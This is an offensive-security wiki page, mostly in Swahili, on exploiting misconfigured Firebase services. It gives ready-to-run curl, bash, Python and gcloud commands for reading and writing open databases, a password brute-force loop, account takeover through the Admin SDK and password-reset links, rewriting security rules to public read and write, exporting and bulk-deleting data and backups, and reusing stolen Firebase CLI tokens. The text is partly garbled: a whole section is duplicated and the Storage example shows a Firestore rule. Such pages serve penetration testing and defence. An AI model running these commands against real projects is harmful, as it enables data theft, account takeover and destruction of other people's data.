# GCP - Firebase Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Firebase

### Ufikiaji usio na uthibitisho kwa Firebase Realtime Database
Mshambuliaji hahitaji ruhusa maalum za Firebase kutekeleza shambulio hili. Inahitaji tu kuwepo kwa usanidi wenye udhaifu kwenye security rules za Firebase Realtime Database, ambapo kanuni zimewekwa kwa `.read: true` au `.write: true`, kuruhusu ufikiaji wa kusoma au kuandika kwa umma.

Mshambuliaji lazima atambue URL ya database, ambayo kawaida inafuata muundo: `https://<project-id>.firebaseio.com/`.

URL hii inaweza kupatikana kupitia reverse engineering ya mobile application (ku-decompile Android APKs au kuchambua iOS apps), kuchambua faili za usanidi kama google-services.json (Android) au GoogleService-Info.plist (iOS), kukagua chanzo cha web applications, au kuchunguza trafiki ya mtandao ili kubaini maombi kwa maeneo ya `*.firebaseio.com`.

Mshambuliaji hutatua URL ya database na kuangalia kama imefunuliwa kwa umma, kisha anapata data na anaweza kuandika taarifa zenye madhara.

Kwanza, wanaangalia kama database inaruhusu ufikiaji wa kusoma kwa kuongeza .json kwenye URL.
```bash
curl https://<project-id>-default-rtdb.firebaseio.com/.json
```
Ikiwa jibu linajumuisha JSON data au null (badala ya "Permission Denied"), database inaruhusu read access. Ili kupima write access, mshambuliaji anaweza kujaribu kutuma test write request kwa kutumia Firebase REST API.
```bash
curl -X PUT https://<project-id>-default-rtdb.firebaseio.com/test.json -d '{"test": "data"}'
```
Iwapo operesheni itafanikiwa, hifadhidata pia inaruhusu kuandika.


### Ufichuzi wa data katika Cloud Firestore
Mshambuliaji hahitaji ruhusa maalum za Firebase ili kutekeleza shambulio hili. Inahitaji tu kuwa kuna usanidi uliokosa usalama katika kanuni za usalama za Cloud Firestore ambapo kanuni zinaruhusu ufikivu wa kusoma au kuandika bila uthibitishaji au kwa uthibitisho usiotosha. Mfano wa kanuni iliyopangwa vibaya inayotoa ufikivu kamili ni:
```bash
service cloud.firestore {
match /databases/{database}/documents/{document=**} {
allow read, write: if true;
}
}
```
Sheria hii inamruhusu mtu yeyote kusoma na kuandika nyaraka zote bila vizuizi. Kanuni za Firestore ni za kina na zinatumika kwa kila mkusanyiko na nyaraka, kwa hivyo kosa katika kanuni maalum linaweza kufichua tu mikusanyiko fulani.

Mshambuliaji lazima atambue Firebase Project ID, ambayo inaweza kupatikana kupitia mobile app reverse engineering, uchambuzi wa faili za usanidi kama google-services.json au GoogleService-Info.plist, ukaguzi wa chanzo cha programu za wavuti, au kuchambua trafiki ya mtandao ili kutambua maombi kwa firestore.googleapis.com.
Firestore REST API inatumia muundo:
```bash
https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>/<document>
```
Ikiwa sheria zinaruhusu unauthenticated read access, attacker anaweza kusoma collections and documents. Kwanza, wanajaribu kufikia collection maalum:
```bash
curl https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>
```
Ikiwa mwitikio una nyaraka za JSON badala ya kosa la ruhusa, mkusanyo umefunuliwa. Mshambuliaji anaweza kuorodhesha makusanyo yote yanayopatikana kwa kujaribu majina ya kawaida au kuchambua muundo wa programu. Ili kufikia nyaraka maalum:
```bash
curl https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>/<document>
```
Ikiwa sheria zinaruhusu upatikanaji wa kuandika bila kuthibitishwa au hazina uthibitisho wa kutosha, mshambuliaji anaweza kuunda nyaraka mpya:
```bash
curl -X POST https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection> \
-H "Content-Type: application/json" \
-d '{
"fields": {
"name": {"stringValue": "Test"},
"email": {"stringValue": "test@example.com"}
}
}'
```
Ili kubadilisha hati iliyopo, tumia PATCH:
```bash
curl -X PATCH https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/users/<user-id> \
-H "Content-Type: application/json" \
-d '{
"fields": {
"role": {"stringValue": "admin"}
}
}'
```
Ili kufuta hati na kusababisha kukataliwa kwa huduma:
```bash
curl -X DELETE https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>/<document>
```
### Kufichuka kwa faili katika Firebase Storage
Mshambuliaji hahitaji ruhusa maalum za Firebase kutekeleza shambulio hili. Inahitaji tu kuwepo kwa usanidi wenye udhaifu katika Firebase Storage security rules ambapo sheria zinaruhusu read au write access bila authentication au kwa uthibitisho usiofaa. Storage rules hudhibiti ruhusa za read na write kwa kujitegemea, kwa hivyo kosa katika rule unaweza kufichua read access tu, write access tu, au zote mbili. Mfano wa rule iliyopangwa vibaya inayotoa full access ni:
```bash
service cloud.firestore {
match /databases/{database}/documents/{document=**} {
allow read, write: if true;
}
}
```
Kanuni hii inaruhusu upatikanaji wa kusoma na kuandika kwa nyaraka zote bila vikwazo vyovyote. Kanuni za Firestore ni za kina na zinatumika kwa kila collection na kila document, kwa hivyo kosa katika kanuni maalum linaweza kufichua collections fulani pekee. Mdukuzi anahitaji kubaini Firebase Project ID, ambayo inaweza kupatikana kupitia mobile application reverse engineering, uchambuzi wa faili za usanidi kama google-services.json au GoogleService-Info.plist, ukaguzi wa source code wa web application, au uchambuzi wa network traffic ili kubaini maombi kwenda firestore.googleapis.com.
Firestore REST API inatumia muundo: `https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>/<document>.`

Ikiwa kanuni zinaruhusu upatikanaji wa kusoma bila uthibitisho, mdukuzi anaweza kusoma collections and documents. Kwanza, wanajaribu kufikia collection maalum.
```bash
curl "https://firebasestorage.googleapis.com/v0/b/<bucket>/o"
curl "https://firebasestorage.googleapis.com/v0/b/<bucket>/o?prefix=<path>"
```
Ikiwa jibu linaorodhesha faili badala ya kosa la ruhusa, faili iko wazi. Mdukuzi anaweza kuona yaliyomo kwenye faili kwa kubainisha njia yake:
```bash
curl "https://firebasestorage.googleapis.com/v0/b/<bucket>/o/<urlencode(path)>"
```
Ikiwa kanuni zinaruhusu upatikanaji wa kuandika bila kuthibitishwa au zina ukaguzi mdogo, mshambuliaji anaweza kupakia faili zenye madhara. Ili kupakia faili kupitia REST API:
```bash
curl -X POST "https://firebasestorage.googleapis.com/v0/b/<bucket>/o?name=<path>" \
-H "Content-Type: <content-type>" \
--data-binary @<local-file>
```
Mshambulizi anaweza kupakia code shells, malware payloads, au faili kubwa ili kusababisha denial of service. Ikiwa programu inachakata au inatekeleza faili zilizopakuliwa, mshambulizi anaweza kupata remote code execution. Ili kufuta faili na kusababisha denial of service:
```bash
curl -X DELETE "https://firebasestorage.googleapis.com/v0/b/<bucket>/o/<path>"
```
### Kuitishwa kwa Firebase Cloud Functions za umma
Mshambuliaji hahitaji ruhusa maalum za Firebase ili kuitumia tatizo hili; inahitaji tu kwamba Cloud Function inapatikana hadharani kupitia HTTP bila uthibitishaji.

Function iko hatarini inapokuwa imewekwa kwa usalama duni:

- Inatumia functions.https.onRequest, ambayo haitekelezi uthibitishaji (tofauti na onCall functions).
- Msimbo wa function haukidhi uthibitishaji wa mtumiaji (kwa mfano, hakuna ukaguzi wa request.auth au context.auth).
- Function inapatikana hadharani ndani ya IAM, ikimaanisha allUsers wana jukumu roles/cloudfunctions.invoker. Hii ni tabia ya kawaida kwa HTTP functions isipokuwa msanidi programu apeane upatikanaji.

Firebase HTTP Cloud Functions zinaonyeshwa kupitia URL kama vile:

- https://<region>-<project-id>.cloudfunctions.net/<function-name>
- https://<project-id>.web.app/<function-name> (when integrated with Firebase Hosting)

Mshambuliaji anaweza kugundua URL hizi kupitia uchambuzi wa msimbo wa chanzo, uchunguzi wa trafiki ya mtandao, matumizi ya zana za kuorodhesha (enumeration tools), au uhandisi wa nyuma wa app za simu.
Ikiwa function imefunuliwa hadharani na haina uthibitishaji, mshambuliaji anaweza kuitisha moja kwa moja bila taarifa za uthibitishaji.
```bash
# Invoke public HTTP function with GET
curl "https://<region>-<project-id>.cloudfunctions.net/<function-name>"
# Invoke public HTTP function with POST and data
curl -X POST "https://<region>-<project-id>.cloudfunctions.net/<function-name>" \
-H "Content-Type: application/json" \
-d '{"param1": "value1", "param2": "value2"}'
```
Ikiwa function haitakagua kwa usahihi ingizo, mshambulizi anaweza kujaribu mashambulizi mengine kama code injection au command injection.

### Brute-force attack dhidi ya Firebase Authentication kwa sera ya nywila dhaifu
Mshambulizi hahitaji ruhusa maalum za Firebase ili kufanya shambulio hili. Inahitaji tu kwamba Firebase API Key imefunuliwa katika mobile au web applications, na kwamba sera ya nywila haijasanifiwa kwa mahitaji madhubuti zaidi kuliko defaults.

Mshambulizi lazima aitambue Firebase API Key, ambayo inaweza kupatikana kupitia reverse engineering ya mobile app, uchambuzi wa configuration files kama google-services.json au GoogleService-Info.plist, ukaguzi wa source code wa web applications (kwa mfano, katika bootstrap.js), au uchambuzi wa network traffic.

Firebase Authentication’s REST API uses the endpoint:
`https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=<API_KEY>`
kuhusu ku-authenticate kwa email na password.

Ikiwa Email Enumeration Protection imezimwa, API error responses zinaweza kufichua kama email ipo kwenye mfumo (EMAIL_NOT_FOUND vs. INVALID_PASSWORD), jambo ambalo linawawezesha washambuliaji kuorodhesha watumiaji kabla ya kujaribu kubahatisha nywila. Wakati ulinzi huu umewezeshwa, API inarudisha ujumbe mmoja wa kosa kwa zote emails zisizokuwepo na nywila zisizo sahihi, kuzuia user enumeration.

Ni muhimu kutambua kwamba Firebase Authentication inatekeleza rate limiting, ambayo inaweza kuzuia requests ikiwa majaribio mengi ya authentication yatatokea kwa muda mfupi. Kwa sababu hii, mshambulizi angehitaji kuingiza ucheleweshaji kati ya majaribio ili kuepuka kuelezewa na rate-limited.

Mshambulizi anaitambua API Key na kufanya majaribio ya authentication kwa nywila nyingi dhidi ya akaunti zilizojulikana. Ikiwa Email Enumeration Protection imezimwa, mshambulizi anaweza kuorodhesha watumiaji walio wengi kwa kuchambua error responses:
```bash
# Attempt authentication with a known email and an incorrect password
curl -X POST "https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=<API_KEY>" \
-H "Content-Type: application/json" \
-d '{
"email": "usuario@example.com",
"password": "password",
"returnSecureToken": true
}'
```
Ikiwa jibu lina EMAIL_NOT_FOUND, barua pepe haipo katika mfumo. Ikiwa lina INVALID_PASSWORD, barua pepe ipo lakini nenosiri si sahihi, ikithibitisha kuwa mtumiaji ameandikishwa. Mara mtumiaji sahihi atakapotambuliwa, mshambuliaji anaweza kufanya jaribio za brute-force. Ni muhimu kuweka mapumziko kati ya majaribio ili kuepuka mifumo ya rate-limiting ya Firebase Authentication:
```bash
counter=1
for password in $(cat wordlist.txt); do
echo "Intento $counter: probando contraseña '$password'"
response=$(curl -s -X POST "https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=<API_KEY>" \
-H "Content-Type: application/json" \
-d "{\"email\":\"usuario@example.com\",\"password\":\"$password\",\"returnSecureToken\":true}")

if echo "$response" | grep -q "idToken"; then
echo "Contraseña encontrada: $password (intento $counter)"
break
fi

# Stop for the rate limiting
sleep 1
counter=$((counter + 1))
done
```
Kwa sera ya nenosiri ya chaguo-msingi (minimum 6 characters, hakuna mahitaji ya complexity), mshambulizi anaweza kujaribu mchanganyiko wote wa nenosiri za characters 6, ambazo zinawakilisha nafasi ndogo ya utafutaji ikilinganishwa na sera za nenosiri zenye ukali zaidi.

### Usimamizi wa watumiaji katika Firebase Authentication

Mshambulizi anahitaji ruhusa maalum za Firebase Authentication ili kutekeleza shambulio hili. Ruhusa zinazohitajika ni:

- `firebaseauth.users.create` to create users
- `firebaseauth.users.update` to modify existing users
- `firebaseauth.users.delete` to delete users
- `firebaseauth.users.get` to retrieve user information
- `firebaseauth.users.sendEmail` to send emails to users
- `firebaseauth.users.createSession` to create user sessions

Ruhusa hizi zipo katika `roles/firebaseauth.admin` role, ambayo inatoa ufikiaji kamili wa kusoma/kuandika kwa rasilimali za Firebase Authentication. Pia zimo katika majukumu ya ngazi ya juu kama roles/firebase.developAdmin (ambayo inajumuisha ruhusa zote za firebaseauth.*) na roles/firebase.admin (ufikiaji kamili wa huduma zote za Firebase).

Ili kutumia Firebase Admin SDK, mshambulizi atahitaji kufikia service account credentials (JSON file), ambazo zinaweza kupatikana kwenye mifumo iliyovamiwa, repositori za msimbo zilizofunguliwa hadharani, mifumo ya CI/CD iliyovamiwa, au kupitia uvamizi wa akaunti za waendelezaji ambazo zina ufikiaji wa credentials hizi.

Hatua ya kwanza ni kusanidi Firebase Admin SDK kwa kutumia service account credentials.
```bash
import firebase_admin
from firebase_admin import credentials, auth
cred = credentials.Certificate('path/to/serviceAccountKey.json')
firebase_admin.initialize_app(cred)
```
Ili kuunda mtumiaji mbaya kwa kutumia barua pepe ya mwathirika, mshambulizi angejaribu kutumia Firebase Admin SDK kuunda akaunti mpya kwa barua pepe hiyo.
```bash
user = auth.create_user(
email='victima@example.com',
email_verified=False,
password='password123',
display_name='Usuario Malicioso',
disabled=False
)
print(f'Usuario creado: {user.uid}')
```
Ili kubadilisha mtumiaji aliyepo, attacker angeweza kusasisha mashamba kama anwani ya barua pepe, hali ya uthibitisho, au ikiwa akaunti imezimwa.
```bash
user = auth.update_user(
uid,
email='nuevo-email@example.com',
email_verified=True,
disabled=False
)
print(f'Usuario actualizado: {user.uid}')
```
Ili kufuta akaunti ya mtumiaji na kusababisha denial of service, mshambuliaji angewasilisha ombi la kuondoa mtumiaji kabisa.
```bash
auth.delete_user(uid)
print('Usuario eliminado exitosamente')
```
Mshambuliaji pia anaweza kupata taarifa kuhusu watumiaji waliopo kwa kuomba UID yao au anwani ya barua pepe.
```bash
user = auth.get_user(uid)
print(f'Información del usuario: {user.uid}, {user.email}')
user = auth.get_user_by_email('usuario@example.com')
print(f'Información del usuario: {user.uid}, {user.email}')
```
Zaidi ya hayo, mshambuliaji anaweza kuunda viungo vya uthibitisho au viungo vya urejeshaji wa nywila ili kubadilisha nywila ya mtumiaji na kupata ufikiaji wa akaunti yake.
```bash
link = auth.generate_email_verification_link(email)
print(f'Link de verificación: {link}')
link = auth.generate_password_reset_link(email)
print(f'Link de reset: {link}')
```
### Usimamizi wa watumiaji katika Firebase Authentication
Mshambulizi anahitaji ruhusa maalum za Firebase Authentication ili kutekeleza shambulio hili. Ruhusa zinazohitajika ni:

- `firebaseauth.users.create` ili kuunda watumiaji
- `firebaseauth.users.update` ili kubadilisha watumiaji waliopo
- `firebaseauth.users.delete` ili kufuta watumiaji
- `firebaseauth.users.get` ili kupata taarifa za watumiaji
- `firebaseauth.users.sendEmail` ili kutuma barua pepe kwa watumiaji
- `firebaseauth.users.createSession` ili kuunda vikao vya watumiaji

Ruhusa hizi ziko ndani ya role ya `roles/firebaseauth.admin`, inayotoa nafasi kamili ya kusoma/kuandika kwenye rasilimali za Firebase Authentication. Pia ni sehemu ya role za ngazi ya juu kama `roles/firebase.developAdmin` (inayojumuisha semua firebaseauth.* permissions) na `roles/firebase.admin` (ufikiaji kamili wa huduma zote za Firebase).

Ili kutumia Firebase Admin SDK, mshambulizi angehitaji kupata service account credentials (faili la JSON), ambazo zinaweza kupatikana kutoka kwa mifumo iliyovamiwa, repositori za nambari zilizo wazi hadharani, mazingira ya CI/CD yaliyovamiwa, au kupitia kuingiliwa kwa akaunti za developer ambazo zina ufikiaji wa credential hizi.

Hatua ya kwanza ni kusanidi Firebase Admin SDK ukitumia service account credentials.
```bash
import firebase_admin
from firebase_admin import credentials, auth
cred = credentials.Certificate('path/to/serviceAccountKey.json')
firebase_admin.initialize_app(cred)
```
Ili kuunda malicious user kwa kutumia victim’s email, the attacker angejaribu kuunda new user account kwa email hiyo, na kumpatia their own password na profile information.
```bash
user = auth.create_user(
email='victima@example.com',
email_verified=False,
password='password123',
display_name='Usuario Malicioso',
disabled=False
)
print(f'Usuario creado: {user.uid}')
```
Ili kubadilisha mtumiaji aliyeko, attacker angebadilisha mashamba kama anuani ya barua pepe, hali ya uthibitisho, au kama akaunti imelemazwa.
```bash
user = auth.update_user(
uid,
email='nuevo-email@example.com',
email_verified=True,
disabled=False
)
print(f'Usuario actualizado: {user.uid}')
```
Ili kufuta akaunti ya mtumiaji—kwa ufanisi kusababisha denial of service—mshambuliaji atatuma ombi la kumwondoa mtumiaji huyo kwa njia ya kudumu.
```bash
auth.delete_user(uid)
print('Usuario eliminado exitosamente')
```
Mshambuliaji pia anaweza kupata taarifa kuhusu watumiaji waliopo, kama UID yao au email, kwa kuomba maelezo ya mtumiaji kwa UID au kwa anwani ya email.
```bash
user = auth.get_user(uid)
print(f'Información del usuario: {user.uid}, {user.email}')
user = auth.get_user_by_email('usuario@example.com')
print(f'Información del usuario: {user.uid}, {user.email}')
```
Zaidi ya hayo, mshambuliaji anaweza kutengeneza viungo vya uthibitisho au viungo vya upya nenosiri, ambayo yanamwezesha kubadilisha nenosiri la mtumiaji na kuchukua udhibiti wa akaunti.
```bash
link = auth.generate_email_verification_link(email)
print(f'Link de verificación: {link}')
link = auth.generate_password_reset_link(email)
print(f'Link de reset: {link}')
```
### Marekebisho ya sheria za usalama katika huduma za Firebase
Mshambuliaji anahitaji ruhusa maalum ili kurekebisha sheria za usalama kulingana na huduma. Kwa Cloud Firestore na Firebase Cloud Storage, ruhusa zinazohitajika ni `firebaserules.rulesets.create` kwa kuunda rulesets na `firebaserules.releases.create` kwa kupeleka releases. Ruhusa hizi ziko katika jukumu la `roles/firebaserules.admin` au katika majukumu ya ngazi ya juu kama `roles/firebase.developAdmin` na `roles/firebase.admin`. Kwa Firebase Realtime Database, ruhusa inayohitajika ni `firebasedatabase.instances.update`.

Mshambuliaji lazima atumie Firebase REST API kurekebisha sheria za usalama.
Kwanza, mshambuliaji atahitaji kupata token ya ufikiaji kwa kutumia sifa za akaunti ya huduma.
Ili kupata token:
```bash
gcloud auth activate-service-account --key-file=path/to/serviceAccountKey.json
ACCESS_TOKEN=$(gcloud auth print-access-token)
```
Ili kubadilisha Firebase Realtime Database rules:
```bash
curl -X PUT "https://<project-id>-default-rtdb.firebaseio.com/.settings/rules.json?access_token=$ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"rules": {
".read": true,
".write": true
}
}'
```
Ili kubadilisha sheria za Cloud Firestore, mshambuliaji lazima aunde ruleset kisha aitumie (deploy):
```bash
curl -X POST "https://firebaserules.googleapis.com/v1/projects/<project-id>/rulesets" \
-H "Authorization: Bearer $ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"source": {
"files": [{
"name": "firestore.rules",
"content": "rules_version = '\''2'\'';\nservice cloud.firestore {\n  match /databases/{database}/documents {\n    match /{document=**} {\n      allow read, write: if true;\n    }\n  }\n}"
}]
}
}'
```
Amri iliyotangulia inarudisha jina la ruleset katika muundo projects/<project-id>/rulesets/<ruleset-id>. Ili kupeleka toleo jipya, release lazima isasishwe kwa kutumia ombi la PATCH:
```bash
curl -X PATCH "https://firebaserules.googleapis.com/v1/projects/<project-id>/releases/cloud.firestore" \
-H "Authorization: Bearer $ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"release": {
"name": "projects/<project-id>/releases/cloud.firestore",
"rulesetName": "projects/<project-id>/rulesets/<ruleset-id>"
}
}'
```
Ili kubadilisha Firebase Cloud Storage rules:
```bash
curl -X POST "https://firebaserules.googleapis.com/v1/projects/<project-id>/rulesets" \
-H "Authorization: Bearer $ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"source": {
"files": [{
"name": "storage.rules",
"content": "service firebase.storage {\n  match /b/{bucket}/o {\n    match /{allPaths=**} {\n      allow read, write: if true;\n    }\n  }\n}"
}]
}
}'
```
Amri iliyopita inarudisha jina la ruleset kwa muundo projects/<project-id>/rulesets/<ruleset-id>. Ili kupeleka toleo jipya, release lazima isasishwe kwa kutumia ombi la PATCH:
```bash
curl -X PATCH "https://firebaserules.googleapis.com/v1/projects/<project-id>/releases/firebase.storage/<bucket-id>" \
-H "Authorization: Bearer $ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"release": {
"name": "projects/<project-id>/releases/firebase.storage/<bucket-id>",
"rulesetName": "projects/<project-id>/rulesets/<ruleset-id>"
}
}'
```
### Data exfiltration and manipulation in Cloud Firestore
Cloud Firestore inatumia miundombinu na mfumo wa ruhusa ule ule kama Cloud Datastore, hivyo ruhusa za Datastore IAM zinatumika moja kwa moja kwa Firestore. Ili kurekebisha sera za TTL, ruhusa `datastore.indexes.update` inahitajika. Ili kuhamisha nje data, ruhusa `datastore.databases.export` inahitajika. Ili kuingiza data, ruhusa `datastore.databases.import` inahitajika. Ili kufuta data kwa wingi, ruhusa `datastore.databases.bulkDelete` inahitajika.

Kwa shughuli za chelezo (backup) na urejeshaji (restore), ruhusa maalum zinahitajika:

- `datastore.backups.get` na `datastore.backups.list` ili kuorodhesha na kupata maelezo ya chelezo zinazopatikana
- `datastore.backups.delete` ili kufuta chelezo
- `datastore.backups.restoreDatabase` ili kurejesha database kutoka chelezo
- `datastore.backupSchedules.create` na `datastore.backupSchedules.delete` ili kusimamia ratiba za chelezo

Wakati sera ya TTL inapotengenezwa, mali maalum huchaguliwa kutambua entiti zinazoeleweka kufutwa. Mali hii ya TTL lazima iwe ya aina ya Tarehe na wakati. Mshambuliaji anaweza kuchagua mali ambayo tayari ipo au kuteua mali wanayopanga kuongeza baadaye. Ikiwa thamani ya uwanja ni tarehe iliyopita, nyaraka inakuwa inastahili kufutwa mara moja. Mshambuliaji anaweza kutumia gcloud CLI kurekebisha sera za TTL.
```bash
# Enable TTL
gcloud firestore fields ttls update expireAt \
--collection-group=users \
--enable-ttl
# Disable TTL
gcloud firestore fields ttls update expireAt \
--collection-group=users \
--disable-ttl
```
Ili kuhamisha data na exfiltrate, mshambuliaji anaweza kutumia gcloud CLI.
```bash
gcloud firestore export gs://<bucket-name> --project=<project-id> --async --database='(default)'
```
Ili kuingiza data hasidi:
```bash
gcloud firestore import gs://<bucket-name>/<path> --project=<project-id> --async --database='(default)'
```
Ili kufuta data kwa wingi na kusababisha denial of service, mshambuliaji anaweza kutumia zana ya gcloud Firestore bulk-delete kuondoa collections zote.
```bash
gcloud firestore bulk-delete \
--collection-ids=users,posts,messages \
--database='(default)' \
--project=<project-id>
```
Kwa shughuli za backup na restoration, mshambuliaji anaweza kuunda scheduled backups ili kunasa hali ya sasa ya database, kuorodhesha backups zilizopo, restore kutoka kwa backup ili kuandika juu ya mabadiliko ya hivi karibuni, delete backups ili kusababisha hasara ya data ya kudumu, na kuondoa scheduled backups.
Ili kuunda daily backup schedule inayozalisha backup mara moja:
```bash
gcloud firestore backups schedules create \
--database='(default)' \
--recurrence=daily \
--retention=14w \
--project=<project-id>
```
Ili kufanya restore kutoka kwa backup maalum, attacker anaweza kuunda database mpya kwa kutumia data iliyomo katika backup hiyo. Restore operation inaandika data ya backup katika database mpya, ikimaanisha kwamba DATABASE_ID iliyopo haiwezi kutumika.
```bash
gcloud firestore databases restore \
--source-backup=projects/<project-id>/locations/<location>/backups/<backup-id> \
--destination-database='<new-database-id>' \
--project=<project-id>
```
Ili kufuta backup na kusababisha kupotea kwa data kwa kudumu:
```bash
gcloud firestore backups delete \
--backup=<backup-id> \
--project=<project-id>
```
### Ukwibwa na matumizi mabaya ya Firebase CLI credentials
An attacker haitaji ruhusa maalum za Firebase ili kutekeleza shambulio hili, lakini anahitaji kupata ufikiaji wa mfumo wa eneo la msanidi au wa Firebase CLI credentials file. Hizi credentials zimehifadhiwa katika JSON file iliyoko katika:

- Linux/macOS: ~/.config/configstore/firebase-tools.json

- Windows: C:\Users\[User]\.config\configstore\firebase-tools.json

Faili hii ina authentication tokens, zikiwemo refresh_token na access_token, ambazo zinamruhusu attacker kuthibitisha utambulisho kama mtumiaji aliyewahi kuendesha firebase login.

Attacker anapata ufikiaji wa Firebase CLI credentials file. Wanaweza kisha kunakili faili nzima hadi kwenye mfumo wao wenyewe, na Firebase CLI itatumia moja kwa moja credentials kutoka mahali pake pa chaguo-msingi. Baada ya kufanya hivyo, attacker anaweza kuona Firebase projects zote zinazopatikana kwa mtumiaji huyo.
```bash
firebase projects:list
```
{{#include ../../../banners/hacktricks-training.md}}
